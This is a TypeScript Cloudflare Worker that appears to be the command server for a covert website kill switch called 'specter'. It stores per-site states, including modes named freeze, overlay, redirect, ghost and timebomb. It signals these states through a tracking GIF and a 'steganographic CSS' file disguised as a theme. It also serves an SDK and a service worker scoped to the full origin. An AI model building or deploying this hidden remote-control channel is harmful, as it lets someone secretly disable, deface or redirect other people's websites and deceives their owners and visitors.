import { Env, SiteState, StateUpdateBody, RateLimitEntry } from './types'
import { createBeaconResponse } from './png'
import { createCSSResponse } from './css'

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const RATE_LIMIT_WINDOW_MS = 60_000   // 1-minute window
const RATE_LIMIT_MAX_REQUESTS = 30    // max /internal/state calls per IP per window
const STATE_DEFAULT_TTL_SECONDS = 86_400 // 24 hours

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function corsHeaders(origin: string): Record<string, string> {
  return {
    'Access-Control-Allow-Origin': origin || '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Max-Age': '86400',
  }
}

function jsonResponse(
  body: unknown,
  status = 200,
  extraHeaders: Record<string, string> = {},
): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...extraHeaders,
    },
  })
}

function errorResponse(
  message: string,
  status: number,
  origin: string,
): Response {
  return jsonResponse({ ok: false, error: message }, status, corsHeaders(origin))
}

/**
 * Retrieve the site state from KV.
 * Returns null if the key is missing or the value is unparseable.
 */
async function getState(kv: KVNamespace, siteToken: string): Promise<SiteState | null> {
  const raw = await kv.get(`state:${siteToken}`, 'text')
  if (!raw) return null
  try {
    return JSON.parse(raw) as SiteState
  } catch {
    return null
  }
}

/**
 * Default SiteState used when no state has been configured yet.
 * Safe default: kill = false, mode = 'none'.
 */
function defaultState(): SiteState {
  return {
    kill: false,
    mode: 'none',
    config: {},
    updatedAt: Date.now(),
  }
}

/**
 * Rate-limit a given IP address for the /internal/state endpoint.
 * Returns true if the request is allowed, false if it should be rejected.
 */
async function checkRateLimit(kv: KVNamespace, ip: string): Promise<boolean> {
  const key = `ratelimit:internal:${ip}`
  const raw = await kv.get(key, 'text')

  const now = Date.now()
  let entry: RateLimitEntry

  if (raw) {
    try {
      entry = JSON.parse(raw) as RateLimitEntry
    } catch {
      entry = { count: 0, windowStart: now }
    }
  } else {
    entry = { count: 0, windowStart: now }
  }

  // Reset window if expired
  if (now - entry.windowStart > RATE_LIMIT_WINDOW_MS) {
    entry = { count: 0, windowStart: now }
  }

  entry.count += 1

  // Write back with a 2-minute TTL (covers the window + buffer)
  await kv.put(key, JSON.stringify(entry), { expirationTtl: 120 })

  return entry.count <= RATE_LIMIT_MAX_REQUESTS
}

/**
 * Validate the state-update request body.
 * Returns a typed object on success, or a descriptive error string on failure.
 */
function validateStateBody(body: unknown): StateUpdateBody | string {
  if (typeof body !== 'object' || body === null) {
    return 'Body must be a JSON object'
  }

  const b = body as Record<string, unknown>

  if (typeof b.siteToken !== 'string' || b.siteToken.length === 0) {
    return 'siteToken must be a non-empty string'
  }
  if (typeof b.kill !== 'boolean') {
    return 'kill must be a boolean'
  }

  const validModes: SiteState['mode'][] = [
    'freeze', 'overlay', 'redirect', 'ghost', 'timebomb', 'none',
  ]
  if (typeof b.mode !== 'string' || !validModes.includes(b.mode as SiteState['mode'])) {
    return `mode must be one of: ${validModes.join(', ')}`
  }

  if (b.config !== undefined && (typeof b.config !== 'object' || b.config === null || Array.isArray(b.config))) {
    return 'config must be an object if provided'
  }

  if (b.ttl !== undefined && (typeof b.ttl !== 'number' || b.ttl < 60 || b.ttl > 604800)) {
    return 'ttl must be a number between 60 and 604800 (7 days)'
  }

  return {
    siteToken: b.siteToken as string,
    kill: b.kill as boolean,
    mode: b.mode as SiteState['mode'],
    config: (b.config as Record<string, unknown>) ?? {},
    ttl: (b.ttl as number) ?? STATE_DEFAULT_TTL_SECONDS,
  }
}

// ---------------------------------------------------------------------------
// Route handlers
// ---------------------------------------------------------------------------

async function handleBeacon(
  siteToken: string,
  env: Env,
  origin: string,
): Promise<Response> {
  const state = (await getState(env.SPECTER_KV, siteToken)) ?? defaultState()
  const response = await createBeaconResponse(state, siteToken, env.SIGNING_SECRET)

  // Attach CORS headers to the beacon image response
  const cors = corsHeaders(origin)
  for (const [k, v] of Object.entries(cors)) {
    response.headers.set(k, v)
  }
  return response
}

async function handleCSS(
  siteToken: string,
  env: Env,
  origin: string,
): Promise<Response> {
  const state = (await getState(env.SPECTER_KV, siteToken)) ?? defaultState()
  const response = await createCSSResponse(state, siteToken, env.SIGNING_SECRET)

  const cors = corsHeaders(origin)
  for (const [k, v] of Object.entries(cors)) {
    response.headers.set(k, v)
  }
  return response
}

async function handleSDK(env: Env, origin: string): Promise<Response> {
  const js = await env.SPECTER_KV.get('asset:sdk.js', 'text')
  if (!js) {
    return errorResponse('SDK not found', 404, origin)
  }
  return new Response(js, {
    status: 200,
    headers: {
      'Content-Type': 'application/javascript; charset=utf-8',
      'Cache-Control': 'public, max-age=300, s-maxage=300',
      ...corsHeaders(origin),
    },
  })
}

async function handleServiceWorker(env: Env, origin: string): Promise<Response> {
  const js = await env.SPECTER_KV.get('asset:specter-sw.js', 'text')
  if (!js) {
    return errorResponse('Service Worker not found', 404, origin)
  }
  return new Response(js, {
    status: 200,
    headers: {
      'Content-Type': 'application/javascript; charset=utf-8',
      // Service Workers must not be aggressively cached
      'Cache-Control': 'no-cache, no-store',
      // Allow the SW to control the full origin
      'Service-Worker-Allowed': '/',
      ...corsHeaders(origin),
    },
  })
}

async function handleStateUpdate(
  request: Request,
  env: Env,
  clientIP: string,
  origin: string,
): Promise<Response> {
  // --- Auth: Bearer token check ---
  const authHeader = request.headers.get('Authorization') ?? ''
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : ''

  if (!token || token !== env.SIGNING_SECRET) {
    return errorResponse('Unauthorized', 401, origin)
  }

  // --- Rate limiting ---
  const allowed = await checkRateLimit(env.SPECTER_KV, clientIP)
  if (!allowed) {
    return errorResponse('Too many requests', 429, origin)
  }

  // --- Parse body ---
  let body: unknown
  try {
    body = await request.json()
  } catch {
    return errorResponse('Invalid JSON body', 400, origin)
  }

  // --- Validate ---
  const validated = validateStateBody(body)
  if (typeof validated === 'string') {
    return errorResponse(validated, 400, origin)
  }

  // --- Write to KV ---
  const state: SiteState = {
    kill: validated.kill,
    mode: validated.mode,
    config: validated.config ?? {},
    updatedAt: Date.now(),
  }

  await env.SPECTER_KV.put(
    `state:${validated.siteToken}`,
    JSON.stringify(state),
    { expirationTtl: validated.ttl ?? STATE_DEFAULT_TTL_SECONDS },
  )

  return jsonResponse(
    { ok: true, siteToken: validated.siteToken, state },
    200,
    corsHeaders(origin),
  )
}

function handleHealth(origin: string): Response {
  return jsonResponse({ ok: true }, 200, corsHeaders(origin))
}

// ---------------------------------------------------------------------------
// Main fetch handler
// ---------------------------------------------------------------------------

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url)
    const { pathname } = url
    const method = request.method.toUpperCase()
    const origin = request.headers.get('Origin') ?? '*'
    const clientIP =
      request.headers.get('CF-Connecting-IP') ??
      request.headers.get('X-Forwarded-For')?.split(',')[0].trim() ??
      '0.0.0.0'

    // --- CORS preflight ---
    if (method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: corsHeaders(origin),
      })
    }

    try {
      // GET /health
      if (method === 'GET' && pathname === '/health') {
        return handleHealth(origin)
      }

      // GET /v1/b/{siteToken}.gif  — beacon pixel
      const beaconMatch = pathname.match(/^\/v1\/b\/([^/]+)\.gif$/)
      if (method === 'GET' && beaconMatch) {
        const siteToken = decodeURIComponent(beaconMatch[1])
        return await handleBeacon(siteToken, env, origin)
      }

      // GET /v1/theme/{siteToken}.css  — steganographic CSS
      const cssMatch = pathname.match(/^\/v1\/theme\/([^/]+)\.css$/)
      if (method === 'GET' && cssMatch) {
        const siteToken = decodeURIComponent(cssMatch[1])
        return await handleCSS(siteToken, env, origin)
      }

      // GET /v1/sdk.js
      if (method === 'GET' && pathname === '/v1/sdk.js') {
        return await handleSDK(env, origin)
      }

      // GET /v1/sw.js  (served at /specter-sw.js path for SW scope)
      if (method === 'GET' && (pathname === '/v1/sw.js' || pathname === '/specter-sw.js')) {
        return await handleServiceWorker(env, origin)
      }

      // POST /internal/state  — update site state
      if (method === 'POST' && pathname === '/internal/state') {
        return await handleStateUpdate(request, env, clientIP, origin)
      }

      // 404 for anything else
      return errorResponse('Not found', 404, origin)
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Internal server error'
      console.error('[specter-edge] Unhandled error:', message)
      return errorResponse('Internal server error', 500, origin)
    }
  },
}
